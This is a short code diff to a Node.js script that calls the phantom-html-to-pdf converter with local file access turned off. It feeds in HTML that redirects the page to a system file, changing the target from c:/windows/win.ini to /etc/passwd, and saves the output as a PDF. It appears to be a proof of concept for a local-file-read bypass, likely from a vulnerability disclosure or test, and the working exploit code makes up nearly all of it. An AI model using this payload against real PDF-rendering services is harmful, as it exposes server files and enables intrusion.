@@ -2,7 +2,7 @@
 var fs = require('fs')
 var conversion = require("phantom-html-to-pdf")();
 conversion.allowLocalFilesAccess = false
-conversion({ html: "document.write(window.location='c:/windows/win.ini')" }, function(err, pdf) {
+conversion({ html: "document.write(window.location='/etc/passwd')" }, function(err, pdf) {
 var output = fs.createWriteStream('output.pdf')
 console.log(pdf.logs);
 console.log(pdf.numberOfPages);
